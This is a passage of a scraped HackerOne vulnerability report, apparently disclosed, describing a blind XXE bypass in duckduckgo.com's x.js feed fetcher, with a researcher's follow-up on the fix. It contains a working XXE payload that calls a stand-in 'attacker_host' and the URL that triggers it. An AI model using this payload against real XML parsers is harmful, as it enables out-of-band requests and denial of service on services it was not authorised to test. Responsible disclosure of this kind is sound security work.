Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree.\n\n**Steps for reproduction:**\n1. Attacker creates a public server and hosts a file with the following content:\n\n```xml\n\u003c?xml version=\"1.0\" ?\u003e\n\u003c!DOCTYPE root [\n\u003c!ENTITY % ext SYSTEM \"http://attacker_host/Blind_xxe\"\u003e %ext;\n]\u003e\n\u003cr\u003e\u003c/r\u003e\n```\n2. User goes on https://duckduckgo.com/x.js?u=http://attacker_host/xxe.xml\n3. The `http://attacker_host/Blind_xxe` resource will be requested by an host {F413045}\n\nI'd like to say that this affects not only `duckduckgo.com`, but also `api.duckduckgo.com`. Anyway, the #483908 report is still in the `triaged` state, so I think that will not be right against you submit another report also for the `api.duckduckgo.com` domain.\n\n## Impact\n\nBlind XXE leads to `dos` and `blind injection`.","weakness":{"id":54,"name":"XML External Entities (XXE)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":413045,"file_name":"xxe.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/413/045/a178d3370c409f1fe5b815ccd5e7e89fcc763dd2/xxe.png?response-content-disposition=attachment%3B%20filename%3D%22xxe.png%22%3B%20filename%2A%3DUTF-8%27%27xxe.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150503Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2256c2c68e152074b1188787bd11321044f9ea4bacd344e9ec51d1b3e881f47f","file_size":119672,"type":"image/png"}],"allow_singular_disclosure_at":"2019-03-20T19:28:03.951Z","allow_singular_disclosure_after":-80854619.84619792,"singular_disclosure_allowed":true,"vote_count":150,"voters":["dee-see","base_64","spam404","flashdisk","ali","sudi","loony_dev","cswiers","an0nym0us","sachin_kumar_","and 140 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":8671,"asset_type":"URL","asset_identifier":"*.duckduckgo.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4044612,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @mik317.

@tim_ddg ,\nyeah, the issue is fixed now :)\nI've tried also to bypass this fix, but seems good designed and implemented, even if I don't understand if the fix is based on the `origin` or if is based on the `content of the fetched file` (due to the fact that if I insert my host, I don't receive any request, thing that tells me that the fix is based mainly on the `origin`).\n\nIf the fix is based _only_ on the `origin`, please keep in mind that a verified endpoint, like `https://spreadprivacy.com/rss/` (that is parsed also now: https://duckduckgo.com/x.js?u=https://spreadprivacy.com/rss/), changed by an attacker can lead to the issue again.\nHope that the fix has implemented not only and `origin`, but also a `content` filter :)\n\nThank you again,\nMik\n\n**PS:**\nIf is all ok, can we
